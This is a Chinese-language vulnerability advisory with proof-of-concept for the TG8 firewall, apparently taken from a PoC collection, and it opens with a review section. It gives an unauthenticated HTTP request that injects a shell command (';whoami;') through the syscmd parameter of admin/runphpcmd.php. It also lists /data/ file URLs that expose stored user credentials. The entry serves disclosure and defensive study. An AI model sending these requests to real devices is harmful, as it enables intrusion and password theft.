---
source: "Threekiii/Awesome-POC"
id: "vw-2be1ce3f05752ff87c007512"
entity_id: "ve-2be1ce3f05752ff87c007512"
schema_version: "1"
title: "TG8 防火墙 RCE及密码泄漏漏洞"
product: "TG8防火墙"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "声称均无需认证；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/TG8/TG8%20%E9%98%B2%E7%81%AB%E5%A2%99%20RCE%E5%8F%8A%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据；读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_status: "unknown"
---

# TG8 防火墙 RCE及密码泄漏漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：TG8防火墙
- 本文讨论：admin/runphpcmd.php命令注入与data目录凭据泄露
- 版本、权限与配置前提：声称均无需认证；版本未知
- 资料类型：双漏洞公告/PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- sudo只作用前段check_gui_login.sh，分号whoami在Web进程身份运行，不能自动称root
- 两种独立根因应作为多实体关联；密码文件编号枚举范围与结构未讲
- 无实际输出或固件/修复信息，但给SSD原始报告链接有价值
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据
- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- SSD公告影响范围和凭据性质待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

TG8防火墙中存在两个漏洞，远程用户可以以用户身份执行命令而无需通过设备进行身份验证。第二个漏洞允许在不经过身份验证的情况下公开现有用户的密码。

参考链接：

- https://ssd-disclosure.com/ssd-advisory-tg8-firewall-preauth-rce-and-password-disclosure/

## 漏洞复现

### RCE

poc：

```http
POST http://<server>/admin/runphpcmd.php HTTP/1.1
Host: Server
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 68
Connection: keep-alive


syscmd=sudo+%2Fhome%2FTG8%2Fv3%2Fsyscmd%2Fcheck_gui_login.sh+<Payload>++local
```

执行whoami：

```
syscmd=sudo+/home/TG8/v3/syscmd/check_gui_login.sh+;whoami;++local
```

### 密码泄露

/data/目录下储存了登录过用户的凭据，无需登录即可访问此目录下的文件。

例如：

```
http://<server>/data/w-341.tg
http://<server>/data/w-342.tg
http://<server>/data/r-341.tg
http://<server>/data/r-342.tg
```


---

> 来源：Threekiii/Awesome-POC
